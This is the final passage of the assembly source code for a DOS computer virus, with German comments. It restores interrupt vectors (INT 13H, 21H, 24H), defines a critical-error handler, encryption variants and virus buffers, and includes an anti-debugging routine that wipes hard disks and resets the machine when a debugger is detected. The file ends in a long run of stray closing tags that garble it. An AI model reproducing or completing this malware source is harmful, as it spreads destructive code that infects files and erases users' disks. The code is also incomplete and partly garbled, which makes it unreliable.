            MOV WORD PTR DS:[13H*4],DX          ;LO-Vector vin INT 13H zurck
            MOV WORD PTR DS:[13H*4+2],AX        ;HI-Vector von INT 13H zurck

            POP_SEGOFS AX,DX                    ;[SEG:OFS] des Vektors: [DS:DX]
            MOV WORD PTR DS:[24H*4],DX          ;LO-Vector vin INT 13H zurck
            MOV WORD PTR DS:[24H*4+2],AX        ;HI-Vector von INT 13H zurck

;------------------------------------------------------------------------------
; Speicherblock freigeben:
;------------------------------------------------------------------------------
            DOS_FREEMEM BP                      ;Speicherblock freigeben

;------------------------------------------------------------------------------
            JMP END21POP                        ;INT Beenden --> END21POP

NEU21       ENDP

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ NEU24:                                                                     ³
;³----------------------------------------------------------------------------³
;³ Neuer INT 24H (Critical Error) Handler.                                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
NEU24       PROC FAR

            MOV AL,3                            ;Aktuelle Funktion abbrechen.
            IRET                                ;--> Zurck zum Fehler

NEU24       ENDP

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ GET_RND:                                                                   ³
;³----------------------------------------------------------------------------³
;³ Zufallszahl in <ax> zurckliefern (RND.INC):                               ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
GET_RND     PROC NEAR

            PUSH BX                 ;REGs sichern
            PUSH CX                 ; "      "
            PUSH DX                 ; "      "

            RND AX,CS:[INITWERT]    ;Mit RNDINIT zuerst initialisieren! (s.o.)

            POP DX                  ;REGs zurckholen
            POP CX                  ; "        "
            POP BX                  ; "        "

            RET                     ;--> Back to sender

GET_RND     ENDP

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ GOODBYE:                                                                   ³
;³----------------------------------------------------------------------------³
;³ Debugger aktiv? Wenn JA --> HDs l”schen und einen Reset ausfhren!         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;##############################################################################
IF SCHARF
  GOODBYE   PROC NEAR
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
;Vector von INT 4 testen, wenn kein Debugger aktiv ist, zeigt der Vector auf
;einen IRET (0cfh) !!!
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
            XOR AX,AX                         ;<ds> wieder auf...
            MOV ES,AX                         ;...SEG 0
            LES BX,ES:[1*4]
            CMP BYTE PTR ES:[BX],0CFH         ;[SEG:OFS] des Vektors: [AX:DX]
            JNE WITZIG                        ;LO-Vector vin INT 13H zurck
            POP AX                            ;HI-Vector von INT 13H zurck
            SUB AX,BP
            CMP AX,OFFSET FAKE_INTO+1         ;[SEG:OFS] des Vektors: [DS:DX]
            JNE WITZIG                        ;LO-Vector vin INT 13H zurck
                                              ;HI-Vector von INT 13H zurck
            POP AX
            POP BX                            ;<ds> wieder auf...
                                              ;...SEG 0
            POP ES
            JMP NO_GOODY                      ;[SEG:OFS] des Vektors: [AX:DX]
WITZIG:     IF ZERSTOER                       ;LO-Vector vin INT 13H zurck
              LOESCH                          ;HI-Vector von INT 13H zurck
            ENDIF
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

            RESET                                                               ;--> RESET

  GOODBYE   ENDP
ENDIF
;##############################################################################

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ SEEK_BEG:                                                                  ³
;³----------------------------------------------------------------------------³
;³ Dateizeiger auf den Anfang der Datei setzen.                               ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
SEEK_BEG    PROC NEAR

            DOS_FSEEK BX,0,0,0      ;FPtr relativ zum Anfang
            RET                     ;--> Zurck!

SEEK_BEG    ENDP

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ GODOS:                                                                     ³
;³----------------------------------------------------------------------------³
;³ GODOS: Direkter Aufruf von INT 21H                                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
GODOS       PROC NEAR

            PUSHF
            CALL DWORD PTR CS:[ALT21]           ;INT 21H direkt aufrufen.
            RET

GODOS       ENDP

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ VIRUSBUF:                                                                  ³
;³----------------------------------------------------------------------------³
;³ Variablen und Puffervereinbarungen.                                        ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
VIRUSBUF    PROC

;------------------------------------------------------------------------------
; Codiervarianten ablegen:
;------------------------------------------------------------------------------
            VAR_CODER ,CRYP_STRT,CRYP_END,,CRYPT

;------------------------------------------------------------------------------
; Allgemeine Variablen:
;------------------------------------------------------------------------------
            VAR_INTERN              ;Virus-interne Vars
VIR_END     EQU $                   ;ENDE des Virus
            VAR_EXTERN              ;Virus-externe Vars

VIRUSBUF    ENDP

;------------------------------------------------------------------------------
VIRUS       ENDS

            END START

;{----------------------------------------------------------------------------}

</ds></ds></ax></ds></cx></ax></es></ax></offset></dx></sp></sp></ss></cs></ss></ip></cs></ip></cs></cx></ip></ip></dx></cs></cx></cs></cs></cs></ax></cs></cs></di></dx></ax></dx></ax></bp></ip></offset></ip></ds:si></offset></offset></cs></ds></bx></ds></bp></bp></ax></bp></bp></ss></ss></ss></sp></sp></---></es></ds></ds></bx></es></es></ax></ax></es></es></ds></es></ax></es></ds></ax></es></es></bx></ds></ds></es></es></ds></ax></ds></cs></si></cs></cs></es></ds></es></ds>